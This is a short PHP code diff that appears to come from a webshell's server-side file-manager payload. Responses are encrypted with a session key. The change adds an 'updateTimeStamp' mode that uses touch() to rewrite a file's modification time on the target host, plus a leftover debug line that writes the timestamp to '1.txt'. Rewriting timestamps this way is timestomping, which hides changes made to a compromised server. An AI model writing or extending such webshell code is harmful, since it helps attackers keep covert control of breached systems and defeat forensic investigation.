@@ -32,8 +32,9 @@ function delDir($dir)
     return rmdir($dir);
 }
 
-function main($mode, $path = ".", $content = "", $charset = "",$newpath="")
+function main($mode, $path = ".", $content = "", $charset = "",$newpath="", $createTimeStamp="", $modifyTimeStamp="", $accessTimeStamp="")
 {
+    file_put_contents("1.txt", $modifyTimeStamp);
 	//$path=getgbkStr($path);
 	$path=getSafeStr($path);
     $result = array();
@@ -190,7 +191,10 @@ function main($mode, $path = ".", $content = "", $charset = "",$newpath="")
             echo encrypt(json_encode($result), $_SESSION['k']);
             break;
         case "updateTimeStamp":
-
+            date_default_timezone_set('UTC');
+            touch($path, strtotime($modifyTimeStamp));
+            $result["status"] = base64_encode("success");
+            $result["msg"] = base64_encode("修改成功");
             echo encrypt(json_encode($result), $_SESSION['k']);
             break;
         default:
